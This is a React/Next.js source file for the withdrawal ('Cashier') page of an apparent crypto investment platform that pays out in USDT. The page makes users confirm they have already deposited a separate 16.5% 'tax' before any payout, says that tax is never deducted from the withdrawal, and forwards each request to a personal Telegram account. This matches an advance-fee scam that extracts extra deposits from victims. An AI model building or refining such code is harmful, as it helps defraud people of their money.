"use client"

import * as React from "react"
import Link from "next/link"
import { Badge, Button, Card, CardHeader, Modal, Notice, Segmented, Stat, statusTone, TextField } from "@/components/ui"
import { PageHeader } from "@/app/components/page-header"
import { useAuth } from "@/app/providers/auth-provider"
import { useCachedFetch, invalidateCache } from "@/lib/use-cached-fetch"
import { WITHDRAWAL_TAX_RATE, withdrawalTax } from "@/lib/trading"
import { IconArrowUpRight, IconClockHour4 } from "@tabler/icons-react"

const NETWORKS = ["TRC20", "ERC20", "BEP20"].map((n) => ({ value: n, label: n }))

interface WithdrawalRow {
  id: string
  amount: number
  tax: number
  status: string
  createdAt: string
}

/** Balance and history both come from the withdrawals endpoint. */
interface WithdrawalsResponse {
  balance: { returns: number; withdrawn: number; available: number }
  minimum: number
  withdrawals: WithdrawalRow[]
}

function money(n: number) {
  return n.toLocaleString()
}

export default function WithdrawPage() {
  const { user } = useAuth()
  const { data, loading, refresh } = useCachedFetch<WithdrawalsResponse>(user ? "/api/user/withdrawals" : null, { ttl: 30_000 })
  const balance = data?.balance
  const available = balance?.available ?? 0
  const minimum = data?.minimum ?? 50
  const recentWithdrawals = React.useMemo(() => (data?.withdrawals ?? []).slice(0, 5), [data])

  const [amount, setAmount] = React.useState("")
  const [address, setAddress] = React.useState("")
  const [network, setNetwork] = React.useState("TRC20")
  const [showConfirm, setShowConfirm] = React.useState(false)
  const [taxAcknowledged, setTaxAcknowledged] = React.useState(false)
  const [submitting, setSubmitting] = React.useState(false)
  const [error, setError] = React.useState("")
  const [success, setSuccess] = React.useState("")

  const withdrawAmount = amount ? parseFloat(amount) : 0
  // The 16.5% tax is settled up front by the client — it is never taken off the
  // payout, so what they request is exactly what they receive.
  const tax = withdrawalTax(withdrawAmount)
  const receiveAmount = withdrawAmount
  const taxPercent = `${(WITHDRAWAL_TAX_RATE * 100).toFixed(1)}%`

  const handleSubmit = async () => {
    setSubmitting(true)
    setError("")
    try {
      const res = await fetch("/api/user/withdrawals", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ amount: withdrawAmount, address, network, taxAcknowledged }),
      })
      const json = await res.json()
      if (!res.ok) {
        setError(json.error || "Couldn't submit your withdrawal")
        return
      }

      // Keep the Telegram hand-off so support sees the request immediately.
      const message = `💰 *Withdrawal Request*\n\n*Amount:* $${withdrawAmount}\n*Tax deposit (${taxPercent}):* $${tax.toFixed(2)} — settled before payout\n*You receive:* $${receiveAmount.toFixed(2)}\n*Network:* ${network}\n*Address:* ${address}\n*Reference:* ${json.withdrawal.id}`
      window.open(`https://t.me/Patrick_vile?text=${encodeURIComponent(message)}`, "_blank")

      setShowConfirm(false)
      setAmount("")
      setTaxAcknowledged(false)
      setSuccess(`Your $${withdrawAmount.toLocaleString()} withdrawal is pending. We'll email you once it's paid.`)
      invalidateCache("/api/user/")
      await refresh()
    } catch {
      setError("Network error. Please try again.")
    } finally {
      setSubmitting(false)
    }
  }

  const isValid =
    withdrawAmount >= minimum &&
    withdrawAmount <= available &&
    address.trim().length >= 20 &&
    taxAcknowledged

  const amountError =
    withdrawAmount > 0 && withdrawAmount < minimum
      ? `Minimum withdrawal is $${minimum}`
      : withdrawAmount > available
        ? "Amount exceeds what you can withdraw"
        : undefined

  return (
    <div className="space-y-6">
      <PageHeader
        title="Cashier"
        description="Withdraw earnings to your USDT wallet."
        actions={
          <Link href="/app/transactions" className="text-[14px] font-bold text-brand hover:underline">
            View reports
          </Link>
        }
      />

      <div className="grid grid-cols-1 gap-6 lg:grid-cols-[minmax(0,1fr)_360px] lg:items-start">
        {/* Withdrawal form */}
        <Card className="p-5 sm:p-6 animate-fade-up">
          <CardHeader title="Withdraw" description="Funds are sent to the address below once the request is approved." />

          <div className="mt-5 grid grid-cols-2 divide-x divide-[var(--background-hover)] rounded-[8px] bg-background">
            <Stat className="px-4 py-3" label="Available to withdraw" value={loading ? "—" : `$${money(available)}`} hint="Completed returns only" />
            <Stat className="px-4 py-3" label="You receive" value={`$${money(receiveAmount)}`} tone={withdrawAmount > 0 ? "success" : undefined} hint="Paid in full" />
          </div>

          <div className="mt-5 space-y-5">
            <TextField
              label="Amount"
              name="amount"
              type="number"
              inputMode="decimal"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="0.00"
              size="lg"
              leading={<span className="text-[14px] font-bold">USDT</span>}
              inputClassName="pl-16 font-bold tabular-nums"
              trailing={
                <button type="button" onClick={() => setAmount(String(available))} disabled={available <= 0} className="pointer-events-auto text-[12px] font-bold text-brand hover:underline disabled:opacity-40">
                  Max
                </button>
              }
              error={amountError}
              help={`Minimum $${minimum} · up to $${money(available)}`}
            />

            <TextField
              label="Wallet address"
              name="address"
              type="text"
              value={address}
              onChange={(e) => setAddress(e.target.value)}
              placeholder="Enter your USDT address"
              inputClassName="font-mono text-[12px]"
            />

            <div>
              <span className="field-label">Network</span>
              <Segmented items={NETWORKS} value={network} onChange={setNetwork} />
            </div>

            {withdrawAmount > 0 && (
              <dl className="divide-y divide-[var(--background-hover)] rounded-[8px] bg-background px-4">
                <div className="flex items-center justify-between gap-4 py-2.5 text-[14px]">
                  <dt className="text-less">Amount</dt>
                  <dd className="font-bold tabular-nums text-foreground">${money(withdrawAmount)}</dd>
                </div>
                <div className="flex items-center justify-between gap-4 py-2.5 text-[14px]">
                  <dt className="text-less">Tax deposit ({taxPercent}) — payable first</dt>
                  <dd className="tabular-nums text-foreground">${money(tax)}</dd>
                </div>
                <div className="flex items-center justify-between gap-4 py-2.5 text-[14px]">
                  <dt className="font-bold text-foreground">You receive</dt>
                  <dd className="font-bold tabular-nums text-success">${money(receiveAmount)}</dd>
                </div>
              </dl>
            )}

            <label className="flex cursor-pointer items-start gap-3 rounded-[8px] bg-background p-3">
              <input
                type="checkbox"
                checked={taxAcknowledged}
                onChange={(e) => setTaxAcknowledged(e.target.checked)}
                className="mt-0.5 h-4 w-4 flex-shrink-0 accent-[var(--primary)]"
              />
              <span className="text-[12px] leading-[18px] text-less">
                I have deposited the {taxPercent} tax{withdrawAmount > 0 ? ` ($${money(tax)})` : ""} covering this
                withdrawal. It is paid separately and is never deducted from the amount I receive.
              </span>
            </label>

            {error && <Notice tone="danger">{error}</Notice>}
            {success && <Notice tone="success">{success}</Notice>}
            {!loading && available <= 0 && (
              <Notice tone="info">You have nothing to withdraw yet. Returns become withdrawable once a cycle completes.</Notice>
            )}

            <Button type="button" block onClick={() => isValid && setShowConfirm(true)} disabled={!isValid}>
              <IconArrowUpRight className="h-4 w-4" stroke={2} />
              Withdraw
            </Button>
          </div>
        </Card>

        {/* Recent withdrawals */}
        <Card className="p-5 animate-fade-up" style={{ animationDelay: "80ms" }}>
          <CardHeader
            title="Recent withdrawals"
            action={
              <Link href="/app/transactions" className="text-[12px] font-bold text-brand hover:underline">
                View all
              </Link>
            }
          />
          <div className="mt-4 divide-y divide-[var(--background-hover)]">
            {recentWithdrawals.map((tx) => (
              <div key={tx.id} className="flex items-center gap-3 py-3 first:pt-0 last:pb-0">
                <span className="flex h-8 w-8 flex-shrink-0 items-center justify-center rounded-full bg-danger-soft text-destructive">
                  <IconArrowUpRight className="h-4 w-4" stroke={2} />
                </span>
                <div className="min-w-0 flex-1">
                  <div className="text-[14px] font-bold tabular-nums text-foreground">-${money(tx.amount)}</div>
                  <div className="text-[12px] leading-[18px] text-less">
                    {new Date(tx.createdAt).toLocaleDateString(undefined, { day: "numeric", month: "short" })} · Paid in full
                  </div>
                </div>
                <Badge tone={statusTone(tx.status)} className="capitalize">{tx.status}</Badge>
              </div>
            ))}
            {recentWithdrawals.length === 0 && (
              <div className="flex items-center gap-3 rounded-[8px] bg-background p-3">
                <div className="flex h-9 w-9 flex-shrink-0 items-center justify-center rounded-full bg-hover text-less">
                  <IconClockHour4 className="h-4 w-4" stroke={1.8} />
                </div>
                <p className="text-[12px] leading-[18px] text-less">No withdrawals yet. Your requests will appear here with their status.</p>
              </div>
            )}
          </div>
        </Card>
      </div>

      {/* Confirmation */}
      <Modal
        open={showConfirm}
        onClose={() => setShowConfirm(false)}
        title="Confirm withdrawal"
        footer={
          <>
            <Button variant="secondary" onClick={() => setShowConfirm(false)}>
              Cancel
            </Button>
            <Button onClick={handleSubmit} loading={submitting} disabled={submitting}>Confirm</Button>
          </>
        }
      >
        <dl className="divide-y divide-[var(--background-hover)]">
          <div className="flex items-center justify-between gap-4 py-2.5">
            <dt className="text-less">Amount</dt>
            <dd className="font-bold tabular-nums text-foreground">${money(withdrawAmount)}</dd>
          </div>
          <div className="flex items-center justify-between gap-4 py-2.5">
            <dt className="text-less">Tax ({taxPercent}) — paid separately</dt>
            <dd className="tabular-nums text-foreground">${money(tax)}</dd>
          </div>
          <div className="flex items-center justify-between gap-4 py-2.5">
            <dt className="text-less">Network</dt>
            <dd className="font-bold text-foreground">{network}</dd>
          </div>
          <div className="py-2.5">
            <dt className="mb-1 text-less">Address</dt>
            <dd className="break-all font-mono text-[12px] leading-[18px] text-foreground">{address}</dd>
          </div>
          <div className="flex items-center justify-between gap-4 py-2.5">
            <dt className="font-bold text-foreground">You receive</dt>
            <dd className="font-bold tabular-nums text-success">${money(receiveAmount)}</dd>
          </div>
        </dl>
      </Modal>
    </div>
  )
}
